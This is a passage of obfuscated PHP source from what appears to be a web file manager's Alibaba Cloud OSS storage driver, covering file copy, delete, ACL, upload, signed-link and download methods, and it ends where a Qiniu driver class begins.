$å§Åõµ“ = $‡®Ñ¹€İ + (int) $šÑÙÆøÑ[$›åçˆÑé[1419]]; $¤ê•ÕÂ = (int) $šÑÙÆøÑ[$›åçˆÑé[337]] + $å§Åõµ“ - 1; $ì½³È¬Ÿ = array($›åçˆÑé[1420] => $å§Åõµ“, $›åçˆÑé[1421] => $¤ê•ÕÂ); $¬×éÇÈÄ[] = $this->client->uploadPartCopy($this->bucket, $—Èéæ—ğ, $this->bucket, $this->pathEncode($°ÀŒÆœ§), $ûÆ»ú¾­, $Ê¸‰Ë°Ë, $ì½³È¬Ÿ); $ûÆ»ú¾­ = $ûÆ»ú¾­ + 1; } $¯¡ÈÆå¦ = array(); foreach ($¬×éÇÈÄ as $Ñ„¿ø¤– => $­—œ¤íè) { $¯¡ÈÆå¦[] = array($›åçˆÑé[1422] => $Ñ„¿ø¤– + 1, $›åçˆÑé[1423] => $­—œ¤íè); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($°ÀŒÆœ§), $Ê¸‰Ë°Ë, $¯¡ÈÆå¦); } catch (OSS\Core\OssException $¼Åéïœ¸) { return !1; } return !0; } public function moveFile($øÆ‡÷­Ç, $®û´ò¹¨) { if ($this->copyFile($øÆ‡÷­Ç, $®û´ò¹¨)) { $this->remove($øÆ‡÷­Ç); return $this->getPathOuter($®û´ò¹¨); } return !1; } public function delFile($’ûô°”Ş) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($’ûô°”Ş)); } catch (OSS\Core\OssException $æ…¦…‚ğ) { return !1; } return !0; } public function delFolder($­¼Ãß®¯) { $·İÙÌŞ¼ =& $_SERVER[å¸¿•¶£]; if (!$this->exist($­¼Ãß®¯)) { return !0; } $this->listItemCache = !1; $Æ˜‰ŠÅº = $this->fileList($­¼Ãß®¯); $this->listItemCache = !0; $Õ•€„íÂ = trim($­¼Ãß®¯, $·İÙÌŞ¼[8]) . $·İÙÌŞ¼[8]; if (!empty($­¼Ãß®¯) && $­¼Ãß®¯ !== $·İÙÌŞ¼[198] && !in_array($Õ•€„íÂ, $Æ˜‰ŠÅº[$·İÙÌŞ¼[82]])) { $Æ˜‰ŠÅº[$·İÙÌŞ¼[82]][] = $Õ•€„íÂ; } $ÍâşÍö† = $this->delByBatch($Æ˜‰ŠÅº[$·İÙÌŞ¼[83]]); if (!$ÍâşÍö†) { return !1; } $ÍâşÍö† = $this->delByBatch($Æ˜‰ŠÅº[$·İÙÌŞ¼[82]]); if (!$ÍâşÍö†) { return !1; } return $this->delFile($Õ•€„íÂ); } private function delByBatch($ã¶«‹ø) { foreach (array_chunk($ã¶«‹ø, 1000) as $éÀÒ”) { try { $this->client->deleteObjects($this->bucket, $éÀÒ”); } catch (OSS\Core\OssException $óÕßÀÇË) { return !1; } } return !0; } public function rename($ÌúÃ–¶ï, $ôƒæşõé) { return $this->renameObject($ÌúÃ–¶ï, $ôƒæşõé); } private function fileInfo($ıÈ¦Ş£, $Úü¾»ğ = false, $ŠÊ…±ê = array()) { $Ö†ÄÀÊÍ =& $_SERVER[å¸¿•¶£]; $ØÁŠ„„¨ = array($Ö†ÄÀÊÍ[32] => $this->pathThis($ıÈ¦Ş£), $Ö†ÄÀÊÍ[84] => $this->getPathOuter($ıÈ¦Ş£), $Ö†ÄÀÊÍ[33] => $Ö†ÄÀÊÍ[200], $Ö†ÄÀÊÍ[76] => isset($ŠÊ…±ê[$Ö†ÄÀÊÍ[76]]) ? $ŠÊ…±ê[$Ö†ÄÀÊÍ[76]] : 0, $Ö†ÄÀÊÍ[174] => $this->ext($ıÈ¦Ş£)); if ($Úü¾»ğ) { return $ØÁŠ„„¨; } $ØÁŠ„„¨[$Ö†ÄÀÊÍ[201]] = $ØÁŠ„„¨[$Ö†ÄÀÊÍ[85]] = 0; $ØÁŠ„„¨[$Ö†ÄÀÊÍ[202]] = $ØÁŠ„„¨[$Ö†ÄÀÊÍ[203]] = !0; if (empty($ŠÊ…±ê)) { $Ëİ•¶İÀ = $this->objectMeta($ıÈ¦Ş£); if (!$Ëİ•¶İÀ) { return $ØÁŠ„„¨; } $ŠÊ…±ê = array($Ö†ÄÀÊÍ[85] => strtotime($Ëİ•¶İÀ[$Ö†ÄÀÊÍ[1417]]), $Ö†ÄÀÊÍ[76] => $Ëİ•¶İÀ[$Ö†ÄÀÊÍ[1416]] + 0); } if (isset($ŠÊ…±ê[$Ö†ÄÀÊÍ[76]])) { $ØÁŠ„„¨[$Ö†ÄÀÊÍ[76]] = $ŠÊ…±ê[$Ö†ÄÀÊÍ[76]]; } if (isset($ŠÊ…±ê[$Ö†ÄÀÊÍ[85]])) { $ØÁŠ„„¨[$Ö†ÄÀÊÍ[85]] = $ŠÊ…±ê[$Ö†ÄÀÊÍ[85]]; } if (isset($ŠÊ…±ê[$Ö†ÄÀÊÍ[180]]) && !trim($ØÁŠ„„¨[$Ö†ÄÀÊÍ[85]])) { $ØÁŠ„„¨[$Ö†ÄÀÊÍ[85]] = $ŠÊ…±ê[$Ö†ÄÀÊÍ[180]]; } return $ØÁŠ„„¨; } private function folderInfo($™ÅÌ÷Ï®, $™€ú•ùà = false, $ëßÜÄ² = array()) { $ìıŸ¯˜É =& $_SERVER[å¸¿•¶£]; $µ¼®ÚÄú = array($ìıŸ¯˜É[32] => $this->pathThis($™ÅÌ÷Ï®), $ìıŸ¯˜É[84] => $this->getPathOuter($ìıŸ¯˜É[8] . $™ÅÌ÷Ï®), $ìıŸ¯˜É[33] => $ìıŸ¯˜É[75]); if ($™€ú•ùà) { return $µ¼®ÚÄú; } $µ¼®ÚÄú[$ìıŸ¯˜É[201]] = $µ¼®ÚÄú[$ìıŸ¯˜É[85]] = 0; $µ¼®ÚÄú[$ìıŸ¯˜É[202]] = $µ¼®ÚÄú[$ìıŸ¯˜É[203]] = !0; if (empty($ëßÜÄ²)) { $™ÅÌ÷Ï® = rtrim($™ÅÌ÷Ï®, $ìıŸ¯˜É[8]) . $ìıŸ¯˜É[8]; $Úá¥›€ = $this->objectMeta($™ÅÌ÷Ï®); if (!$Úá¥›€) { return $µ¼®ÚÄú; } $ëßÜÄ² = array($ìıŸ¯˜É[201] => $Úá¥›€[$ìıŸ¯˜É[502]][$ìıŸ¯˜É[1424]], $ìıŸ¯˜É[85] => strtotime($Úá¥›€[$ìıŸ¯˜É[1417]])); } if (isset($ëßÜÄ²[$ìıŸ¯˜É[85]])) { $µ¼®ÚÄú[$ìıŸ¯˜É[85]] = $ëßÜÄ²[$ìıŸ¯˜É[85]]; } if (isset($ëßÜÄ²[$ìıŸ¯˜É[201]])) { $µ¼®ÚÄú[$ìıŸ¯˜É[201]] = $ëßÜÄ²[$ìıŸ¯˜É[201]]; } return $µ¼®ÚÄú; } public function listPath($åş”šˆß, $«ı²á“Š = false) { $âìâ«¾÷ =& $_SERVER[å¸¿•¶£]; $õõ¿ñ˜É = $this->fileList($åş”šˆß, $âìâ«¾÷[8], !0); foreach ($õõ¿ñ˜É[$âìâ«¾÷[82]] as $ÎÁª§í‘ => $‰˜½ô²ı) { $õõ¿ñ˜É[$âìâ«¾÷[82]][$ÎÁª§í‘] = $this->folderInfo($‰˜½ô²ı, $«ı²á“Š, $‰˜½ô²ı); } foreach ($õõ¿ñ˜É[$âìâ«¾÷[83]] as $ÎÁª§í‘ => $‰˜½ô²ı) { $õõ¿ñ˜É[$âìâ«¾÷[83]][$ÎÁª§í‘] = $this->fileInfo($‰˜½ô²ı[$âìâ«¾÷[32]], $«ı²á“Š, $‰˜½ô²ı); } return $õõ¿ñ˜É; } protected function infoChildren($°ÀÆÂ‘ç, &$–»¾šıü) { $†‹ÁÙıÖ =& $_SERVER[å¸¿•¶£]; $éˆÖ·À… = $this->fileList($°ÀÆÂ‘ç, $†‹ÁÙıÖ[12], !0); $–»¾šıü[$†‹ÁÙıÖ[78]] += count($éˆÖ·À…[$†‹ÁÙıÖ[82]]); $–»¾šıü[$†‹ÁÙıÖ[77]] += count($éˆÖ·À…[$†‹ÁÙıÖ[83]]); foreach ($éˆÖ·À…[$†‹ÁÙıÖ[83]] as $§œ¢¾¨) { if (!$§œ¢¾¨ || !$§œ¢¾¨[$†‹ÁÙıÖ[76]]) { continue; } $–»¾šıü[$†‹ÁÙıÖ[76]] += $§œ¢¾¨[$†‹ÁÙıÖ[76]]; } } public function has($ûÉ“¾Ñ, $¿ğ¹”º = false, $şêôˆØ = true) { $™´Á·Áé =& $_SERVER[å¸¿•¶£]; $ûÉ“¾Ñ = trim($ûÉ“¾Ñ, $™´Á·Áé[8]); $²…À·Ø¼ = empty($ûÉ“¾Ñ) && $ûÉ“¾Ñ !== $™´Á·Áé[198] ? $™´Á·Áé[12] : $ûÉ“¾Ñ . $™´Á·Áé[8]; $şÁĞæîî = $™´Á·Áé[12]; $‘‰ÇÍ–¥ = 500; $µÒ¦Ù±’ = $Ò® Œù = 0; while (!0) { check_abort(); $Åõ§½¶˜ = array($™´Á·Áé[1412] => $™´Á·Áé[8], $™´Á·Áé[1413] => $²…À·Ø¼, $™´Á·Áé[1414] => $‘‰ÇÍ–¥, $™´Á·Áé[1415] => $şÁĞæîî); try { $¶ô¡¬À = $this->client->listObjects($this->bucket, $Åõ§½¶˜); } catch (OSS\Core\OssException $±ôÑ¦®ô) { break; } $şÁĞæîî = $¶ô¡¬À->getNextMarker(); $õÇó¢¾¼ = $¶ô¡¬À->getObjectList(); $ˆ¨µù¦Š = $¶ô¡¬À->getPrefixList(); if ($¿ğ¹”º) { if (count($õÇó¢¾¼) > 1 || count($õÇó¢¾¼) == 1 && $õÇó¢¾¼[0]->getKey() != $²…À·Ø¼) { $µÒ¦Ù±’ += count($õÇó¢¾¼) - 1; } if (!empty($ˆ¨µù¦Š)) { $Ò® Œù += count($ˆ¨µù¦Š); } if ($şÁĞæîî === $™´Á·Áé[12]) { break; } continue; } if ($şêôˆØ) { if (!empty($õÇó¢¾¼)) { if (count($õÇó¢¾¼) > 1 || $õÇó¢¾¼[0]->getKey() != $²…À·Ø¼) { return !0; } } } else { if (!empty($ˆ¨µù¦Š)) { return !0; } } if ($şÁĞæîî === $™´Á·Áé[12]) { break; } } if ($¿ğ¹”º) { return array($™´Á·Áé[207] => $µÒ¦Ù±’, $™´Á·Áé[208] => $Ò® Œù); } return !1; } public function listAll($¾«ÜŸÃ¾) { $°åëĞŸ† =& $_SERVER[å¸¿•¶£]; $¤—ª¥æ = $this->fileList($¾«ÜŸÃ¾, $°åëĞŸ†[12], !0); $”ªË´ŠÈ = array_to_keyvalue($¤—ª¥æ[$°åëĞŸ†[83]], $°åëĞŸ†[32]); foreach ($¤—ª¥æ[$°åëĞŸ†[82]] as $±Òğ“áÂ) { if (is_string($±Òğ“áÂ)) { $”ªË´ŠÈ[$±Òğ“áÂ] = array($°åëĞŸ†[76] => 0); } } return $this->listAllFiles($¾«ÜŸÃ¾, $”ªË´ŠÈ); } public function canRead($èÍÍ°‘) { $—ç»ê =& $_SERVER[å¸¿•¶£]; $é˜‚¬ù = $this->pathAcl($èÍÍ°‘); return $é˜‚¬ù == $—ç»ê[1425] || $é˜‚¬ù == $—ç»ê[547] ? !0 : !1; } public function canWrite($©³šÁĞ˜) { $ƒÙ±µºô = $this->pathAcl($©³šÁĞ˜); return $ƒÙ±µºô == $_SERVER[å¸¿•¶£][547] ? !0 : !1; } public function pathAcl($Œ¸ö„¸™) { $¾‰ß’™ =& $_SERVER[å¸¿•¶£]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $›¿Äü´„ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($Œ¸ö„¸™)); } catch (OSS\Core\OssException $šõ†Å¡Ï) { return !1; } $¾Ûëş™¨ = $›¿Äü´„ == $¾‰ß’™[37] ? $this->bucketAcl : $›¿Äü´„; if ($¾Ûëş™¨ == $¾‰ß’™[1426]) { return $¾‰ß’™[1425]; } if ($¾Ûëş™¨ == $¾‰ß’™[1427]) { return $¾‰ß’™[547]; } return $¾Ûëş™¨; } private function chmodPath($½òß”ï, $‘Êïû‚ª = '') { $…øÈ×Œ =& $_SERVER[å¸¿•¶£]; $õü—»ñ = empty($‘Êïû‚ª) ? $…øÈ×Œ[1427] : $‘Êïû‚ª; $é™Ìº¹à = array($…øÈ×Œ[37], $…øÈ×Œ[199], $…øÈ×Œ[1426], $…øÈ×Œ[1427]); if (!in_array($õü—»ñ, $é™Ìº¹à)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($½òß”ï), $õü—»ñ); } catch (OSS\Core\OssException $¿ç––½Æ) { return !1; } return !0; } public function getContent($´¹ïÆöó) { return $this->fileSubstr($´¹ïÆöó, -1); } public function setContent($ÕÀ¸àÌÏ, $œé‘¾ÉÕ = '') { $ü×É¯°â =& $_SERVER[å¸¿•¶£]; try { $ø…É«² = $this->trafficLimit($ü×É¯°â[1428]); $¸™ ½ö‹ = $this->client->putObject($this->bucket, $this->pathEncode($ÕÀ¸àÌÏ), $œé‘¾ÉÕ, $ø…É«²); } catch (OSS\Core\OssException $ö½ú·İø) { return !1; } $ç«Äİ™” = array($ü×É¯°â[1418] => trim($¸™ ½ö‹[$ü×É¯°â[1429]], $ü×É¯°â[118]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ÕÀ¸àÌÏ))); $this->updateObjMeta($ÕÀ¸àÌÏ, $ç«Äİ™”); return isset($¸™ ½ö‹[$ü×É¯°â[1430]][$ü×É¯°â[1377]]) ? !0 : !1; } private function updateObjMeta($Ü»¡¼¹É, $¹ÆöÇ¬Ç) { $Ü»¡¼¹É = $this->pathEncode($Ü»¡¼¹É); try { $üŒĞÆÒ = array(OSS\OssClient::OSS_HEADERS => $¹ÆöÇ¬Ç); $this->client->copyObject($this->bucket, $Ü»¡¼¹É, $this->bucket, $Ü»¡¼¹É, $üŒĞÆÒ); } catch (OSS\Core\OssException $ß¤ò™ò) { return !1; } return !0; } public function upload($¨Ÿ„¬ˆ•, $•ê½âˆÚ, $…Š½Êî† = false, $ÍÇÉûë‡ = REPEAT_REPLACE) { $à¯Åï¢ò =& $_SERVER[å¸¿•¶£]; $Î…‡¤Øª = trim($¨Ÿ„¬ˆ•, $à¯Åï¢ò[8]); $ëÑ¯Èû = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($à¯Åï¢ò[1418] => @md5_file($•ê½âˆÚ)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($¨Ÿ„¬ˆ•))); $ëÑ¯Èû = $this->trafficLimit($à¯Åï¢ò[1428], $ëÑ¯Èû); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($Î…‡¤Øª), $•ê½âˆÚ, $ëÑ¯Èû); } catch (OSS\Core\OssException $Ä‰ƒ÷ªÁ) { return !1; } return $this->getPathOuter($¨Ÿ„¬ˆ•); } public function getHost() { $ Ã¼²­Ä =& $_SERVER[å¸¿•¶£]; $À¤ïğ‡ø = explode($ Ã¼²­Ä[184], parent::getHost()); return $À¤ïğ‡ø[0] . $ Ã¼²­Ä[184] . $this->bucket . $ Ã¼²­Ä[10] . $À¤ïğ‡ø[1]; } public function uploadFormData($©Ôá¹Ûğ, $ù•ãĞí– = 3600) { $©ÃØîüÍ =& $_SERVER[å¸¿•¶£]; if (!($ıÏ© œ = $this->getHost())) { return !1; } $±’“§ßï = $ù•ãĞí–; $éĞ°ãÆ = date($©ÃØîüÍ[1431], time() + $±’“§ßï); $–Ğò¶µ = new DateTime($éĞ°ãÆ); $š™ÅìÔû = $–Ğò¶µ->format(DateTime::ISO8601); $ï»¢¢œ˜ = strpos($š™ÅìÔû, $©ÃØîüÍ[296]); $š™ÅìÔû = substr($š™ÅìÔû, 0, $ï»¢¢œ˜) . $©ÃØîüÍ[1432]; $ôå´Ìúä = 1048576000 * 5; $‚ÔÓÓ·Û = $this->pathFather($©Ôá¹Ûğ); $Û•ÕÅÄ³ = array($©ÃØîüÍ[1331] => $š™ÅìÔû, $©ÃØîüÍ[1332] => array(array($©ÃØîüÍ[1433], 0, $ôå´Ìúä), array($©ÃØîüÍ[1335], $©ÃØîüÍ[1336], $‚ÔÓÓ·Û))); $ß†«ÏÓ = base64_encode(json_encode($Û•ÕÅÄ³)); $úªÅ¬°¿ = base64_encode(hash_hmac($©ÃØîüÍ[232], $ß†«ÏÓ, $this->secret, !0)); $ÑØ¹®å = array($©ÃØîüÍ[1341] => $ß†«ÏÓ, $©ÃØîüÍ[1434] => $this->accessKey, $©ÃØîüÍ[1337] => $©ÃØîüÍ[1329], $©ÃØîüÍ[1435] => $úªÅ¬°¿, $©ÃØîüÍ[182] => $ıÏ© œ); $ÑØ¹®å = $this->trafficLimit($©ÃØîüÍ[1428], $ÑØ¹®å); return $ÑØ¹®å; } public function multiUploadFormData($ç•åâ­”, $–¤÷²’È = 3600) { $‡ÃË·ûè =& $_SERVER[å¸¿•¶£]; if (!($óÄççû = $this->getHost())) { return !1; } $ö–£“š— = $this->trafficLimit($‡ÃË·ûè[1428]); $¼ıªäí” = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ç•åâ­”), $ö–£“š—); return array($‡ÃË·ûè[223] => $¼ıªäí”, $‡ÃË·ûè[182] => $óÄççû . $‡ÃË·ûè[8] . $this->pathEncode($ç•åâ­”), $‡ÃË·ûè[224] => gmdate($‡ÃË·ûè[1436]), $‡ÃË·ûè[94] => $ç•åâ­”); } public function multiUploadAuthData($Ñ™Ÿ©, $ìü‘Ç·ı = array()) { $µÆÚ³ı =& $_SERVER[å¸¿•¶£]; $ª»òÓÊĞ = isset($ìü‘Ç·ı[$µÆÚ³ı[224]]) ? $ìü‘Ç·ı[$µÆÚ³ı[224]] : gmdate($µÆÚ³ı[1436]); $Ó§‡Ñ˜ = isset($ìü‘Ç·ı[$µÆÚ³ı[174]]) ? $ìü‘Ç·ı[$µÆÚ³ı[174]] : $µÆÚ³ı[12]; $ï‚õÁÏ¦ = $Ñ™Ÿ©; if (isset($ìü‘Ç·ı[$µÆÚ³ı[94]])) { $ï‚õÁÏ¦ = $ìü‘Ç·ı[$µÆÚ³ı[94]]; unset($ìü‘Ç·ı[$µÆÚ³ı[94]]); } if (isset($ìü‘Ç·ı[$µÆÚ³ı[225]])) { $ìü‘Ç·ı[$µÆÚ³ı[224]] = $ª»òÓÊĞ; return $this->listUploadParts($ï‚õÁÏ¦, $ìü‘Ç·ı); } $»€öŞüÑ = array($µÆÚ³ı[226], $µÆÚ³ı[12], $µÆÚ³ı[120], $ª»òÓÊĞ, "\x78\55\x6f\163\x73\55\144\141\x74\145\72{$ª»òÓÊĞ}", $µÆÚ³ı[8] . $this->bucket . $µÆÚ³ı[8] . $ï‚õÁÏ¦ . $Ó§‡Ñ˜); if (strpos($Ó§‡Ñ˜, $µÆÚ³ı[227]) === 0) { $»€öŞüÑ[0] = $µÆÚ³ı[228]; if ($©µìÌ©ó = $this->trafficLimit($µÆÚ³ı[1428])) { $ï‚õÁÏ¦ = $µÆÚ³ı[1437]; array_splice($»€öŞüÑ, 5, 0, $ï‚õÁÏ¦ . $µÆÚ³ı[4] . $©µìÌ©ó[$ï‚õÁÏ¦]); } } if (isset($ìü‘Ç·ı[$µÆÚ³ı[229]]) && $ìü‘Ç·ı[$µÆÚ³ı[229]] == $µÆÚ³ı[230]) { $»€öŞüÑ[0] = $µÆÚ³ı[230]; } if (!empty($ìü‘Ç·ı[$µÆÚ³ı[1438]])) { $ÃÏ‡±² = array_merge(array($»€öŞüÑ[4]), $ìü‘Ç·ı[$µÆÚ³ı[1438]]); sort($ÃÏ‡±²); $»€öŞüÑ[4] = implode($µÆÚ³ı[231], $ÃÏ‡±²); } $—è”½Èè = implode($µÆÚ³ı[231], $»€öŞüÑ); $åî¹ºÅÁ = base64_encode(hash_hmac($µÆÚ³ı[232], $—è”½Èè, $this->secret, !0)); $¤ö†¿¢² = $µÆÚ³ı[1402] . $this->accessKey . $µÆÚ³ı[4] . $åî¹ºÅÁ; if (strpos($Ó§‡Ñ˜, $µÆÚ³ı[227]) === 0) { $¤ö†¿¢² = array($µÆÚ³ı[234] => $¤ö†¿¢², $µÆÚ³ı[224] => $ª»òÓÊĞ); if ($©µìÌ©ó) { $¤ö†¿¢² = array_merge($¤ö†¿¢², $©µìÌ©ó); } } return $¤ö†¿¢²; } public function listUploadParts($˜áİ‚ô³, $‡³‘ê®ï) { $×Ÿ®Œ„ =& $_SERVER[å¸¿•¶£]; $¯Øû‰ÂŒ = parse_url_query($‡³‘ê®ï[$×Ÿ®Œ„[174]]); $×µÃÆšï = $this->client->listParts($this->bucket, $this->pathEncode($˜áİ‚ô³), $¯Øû‰ÂŒ[$×Ÿ®Œ„[223]]); $¨Ÿé˜† = $×µÃÆšï->getListPart(); $¶ËéÖ—ö = array(); foreach ($¨Ÿé˜† as $ş­‚Ø”Ë) { $¶ËéÖ—ö[] = array($×Ÿ®Œ„[1422] => $ş­‚Ø”Ë->getPartNumber(), $×Ÿ®Œ„[1423] => trim($ş­‚Ø”Ë->getETag(), $×Ÿ®Œ„[118])); } unset($‡³‘ê®ï[$×Ÿ®Œ„[225]], $‡³‘ê®ï[$×Ÿ®Œ„[229]]); $€ĞÑä = $this->multiUploadAuthData($˜áİ‚ô³, $‡³‘ê®ï); if (empty($€ĞÑä)) { return !1; } return array($×Ÿ®Œ„[234] => $€ĞÑä, $×Ÿ®Œ„[224] => $‡³‘ê®ï[$×Ÿ®Œ„[224]], $×Ÿ®Œ„[236] => $¶ËéÖ—ö); } public function download($§•·ƒÇ, $¹ø‘¶Ò) { if ($this->isFolder($§•·ƒÇ)) { return !1; } try { $ß¼áƒ“ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $¹ø‘¶Ò); $ß¼áƒ“ = $this->trafficLimit($_SERVER[å¸¿•¶£][109], $ß¼áƒ“); $this->client->getObject($this->bucket, $this->pathEncode($§•·ƒÇ), $ß¼áƒ“); } catch (OSS\Core\OssException $¦š‡ ˜§) { return !1; } return $¹ø‘¶Ò; } public function fileSubstr($ˆ›ÑÑÇš, $¶¡ÔåƒÔ = 0, $…³ªÑïŸ = false) { if ($¶¡ÔåƒÔ === -1) { $íß©­Úİ = array(); } else { if ($…³ªÑïŸ === !1) { $Úƒ–Ñáå = $this->size($ˆ›ÑÑÇš); } else { $Úƒ–Ñáå = $¶¡ÔåƒÔ + $…³ªÑïŸ - 1; } $íß©­Úİ = array(OSS\OssClient::OSS_RANGE => "{$¶¡ÔåƒÔ}\55{$Úƒ–Ñáå}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($ˆ›ÑÑÇš), $íß©­Úİ); } catch (OSS\Core\OssException $Èä…Èù·) { think_exception($Èä…Èù·->getMessage()); return !1; } } private function trafficLimit($Ç¶Ô² , $ô”©ØÇ¶ = array()) { $¢Ù¸ó“¿ =& $_SERVER[å¸¿•¶£]; if ($Ç¶Ô²  == $¢Ù¸ó“¿[1428] && $this->isUploadServer() || $Ç¶Ô²  == $¢Ù¸ó“¿[109] && $this->isFileOutServer()) { return $ô”©ØÇ¶; } $­ˆÈ¿§¬ = floatval($GLOBALS[$¢Ù¸ó“¿[6]][$¢Ù¸ó“¿[89]][$¢Ù¸ó“¿[107]][$Ç¶Ô² ]) * 1024 * 1024 * 8; if (!$­ˆÈ¿§¬) { return $ô”©ØÇ¶; } $­ˆÈ¿§¬ = $­ˆÈ¿§¬ < 819200 ? 819200 : ($­ˆÈ¿§¬ > 838860800 ? 838860800 : $­ˆÈ¿§¬); $ô”©ØÇ¶[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($­ˆÈ¿§¬); return $ô”©ØÇ¶; } public function link($ê´”åà“, $¥ƒåîúı = array()) { $øÙ¢§ã» =& $_SERVER[å¸¿•¶£]; if (!$this->exist($ê´”åà“) || $this->isFolder($ê´”åà“)) { return !1; } try { $¥ƒåîúı = $this->trafficLimit($øÙ¢§ã»[109], $¥ƒåîúı); $ìÛ —ÉÖ = $this->client->signUrl($this->bucket, $this->pathEncode($ê´”åà“), 3600 * 12, $øÙ¢§ã»[230], $¥ƒåîúı); return $this->getCdnLink($ìÛ —ÉÖ); } catch (OSS\Core\OssException $ğİ©²‹) { return !1; } } public function fileOut($’¨Å‚¡Ë, $‚„à¨Ú = false, $…ø™æ§õ = false, $›ùö¢Å = '') { $µï”ÎüŸ =& $_SERVER[å¸¿•¶£]; if ($this->isFileOutServer()) { return $this->fileOutServer($’¨Å‚¡Ë, $‚„à¨Ú, $…ø™æ§õ, $›ùö¢Å); } if (!$…ø™æ§õ) { $…ø™æ§õ = $this->pathThis($’¨Å‚¡Ë); } $…ø™æ§õ = rawurlencode($…ø™æ§õ); $ÎÀÖÔüø = get_file_mime(get_path_ext($…ø™æ§õ)); if ($ÎÀÖÔüø == $µï”ÎüŸ[217]) { return parent::fileOut($’¨Å‚¡Ë, $‚„à¨Ú, $…ø™æ§õ, $›ùö¢Å); } $‚„à¨Ú = $‚„à¨Ú ? $µï”ÎüŸ[1439] : $µï”ÎüŸ[1440]; $Àöœ½ƒÜ = array(OSS\OssClient::OSS_SUB_RESOURCE => $µï”ÎüŸ[1441] . rawurlencode("{$‚„à¨Ú}\73\146\x69\x6c\x65\x6e\141\155\145\x3d{$…ø™æ§õ}")); $Àöœ½ƒÜ[OSS\OssClient::OSS_SUB_RESOURCE] .= $µï”ÎüŸ[1442] . rawurlencode($ÎÀÖÔüø); $´Õ¹ñ—¼ = $this->link($’¨Å‚¡Ë, $Àöœ½ƒÜ); $this->fileOutLink($´Õ¹ñ—¼); } public function fileOutServer($„ÖÙªÅ, $û€»Âõï = false, $ØÌÎÇ´½ = false, $ìÑ®»ì£ = '') { parent::fileOut($„ÖÙªÅ, $û€»Âõï, $ØÌÎÇ´½, $ìÑ®»ì£); } public function fileOutImage($§åÃÌŸó, $¸×ï»ûÄ = 250) { $ş¸ï±²Œ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[å¸¿•¶£][1443] . $¸×ï»ûÄ); $µÉï˜¥¦ = $this->link($§åÃÌŸó, $ş¸ï±²Œ); $this->fileOutLink($µÉï˜¥¦); } public function fileOutImageServer($Ä­¨æ¯Ê, $¨Æã»ĞÔ = 250) { parent::fileOutImage($Ä­¨æ¯Ê, $¨Æã»ĞÔ); } public function fileOutLink($³Ù´ËÂ™) { $äîÂìüÙ =& $_SERVER[å¸¿•¶£]; if (!$this->isCdnHost() && substr($³Ù´ËÂ™, 0, 7) == $äîÂìüÙ[1344]) { $³Ù´ËÂ™ = $äîÂìüÙ[1345] . substr($³Ù´ËÂ™, 7); } header($äîÂìüÙ[161] . $³Ù´ËÂ™); die; } public function hashMd5($¼é“¥ı‚, $ÕÆ¯Ï±« = '') { $ˆØ®ÉÓÉ =& $_SERVER[å¸¿•¶£]; $•ô•ÊØ = $this->_objectMeta($¼é“¥ı‚); if (!$•ô•ÊØ) { return $ˆØ®ÉÓÉ[12]; } if (!isset($•ô•ÊØ[$ˆØ®ÉÓÉ[1418]]) && !empty($ÕÆ¯Ï±«)) { $²£ÓˆÈ = $this->updateObjMeta($¼é“¥ı‚, array($ˆØ®ÉÓÉ[1418] => $ÕÆ¯Ï±«)); $•ô•ÊØ[$ˆØ®ÉÓÉ[1418]] = $²£ÓˆÈ ? $ÕÆ¯Ï±« : $ˆØ®ÉÓÉ[12]; } return isset($•ô•ÊØ[$ˆØ®ÉÓÉ[1418]]) ? strtolower($•ô•ÊØ[$ˆØ®ÉÓÉ[1418]]) : $ˆØ®ÉÓÉ[12]; } public function size($‡ô“öİä) { $ªúã·•… = $this->objectMeta($‡ô“öİä); return $ªúã·•… ? $ªúã·•…[$_SERVER[å¸¿•¶£][76]] : 0; } public function info($®à÷ÊÉÎ) { if ($this->isFolder($®à÷ÊÉÎ)) { return $this->folderInfo($®à÷ÊÉÎ); } else { if ($this->isFile($®à÷ÊÉÎ)) { return $this->fileInfo($®à÷ÊÉÎ); } } return !1; } public function exist($–’»ëÙğ) { return $this->isFile($–’»ëÙğ) || $this->isFolder($–’»ëÙğ); } public function isFile($£şèÌ¨) { return !$this->isFolder($£şèÌ¨) && $this->objectMeta($£şèÌ¨); } public function isFolder($ÚØ…õü·) { return $this->cacheMethod($_SERVER[å¸¿•¶£][165], $ÚØ…õü·); } protected function objectMeta($úøüºËË) { return $this->cacheMethod($_SERVER[å¸¿•¶£][167], $úøüºËË); } protected function _objectMeta($µîİ™î) { $”‘»§ä‚ =& $_SERVER[å¸¿•¶£]; try { $ñÚĞıÓ¾ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($µîİ™î)); } catch (OSS\Core\OssException $²ëè®‰Ê) { $ñÚĞıÓ¾ = !1; } if ($ñÚĞıÓ¾) { $ñÚĞıÓ¾[$”‘»§ä‚[76]] = intval($ñÚĞıÓ¾[$”‘»§ä‚[1416]]); } return $ñÚĞıÓ¾; } protected function _isFolder($öªã´†ñ) { $®Í°×…½ =& $_SERVER[å¸¿•¶£]; if ($öªã´†ñ == $®Í°×…½[12] || $öªã´†ñ == $®Í°×…½[8]) { return !0; } $ÉŸ‰ßê = array($®Í°×…½[1412] => $®Í°×…½[8], $®Í°×…½[1413] => rtrim($öªã´†ñ, $®Í°×…½[8]) . $®Í°×…½[8], $®Í°×…½[1414] => 1, $®Í°×…½[1415] => $®Í°×…½[12]); $Ûóøˆ´º = $this->client->listObjects($this->bucket, $ÉŸ‰ßê); if ($Ûóøˆ´º->getObjectList() || $Ûóøˆ´º->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected 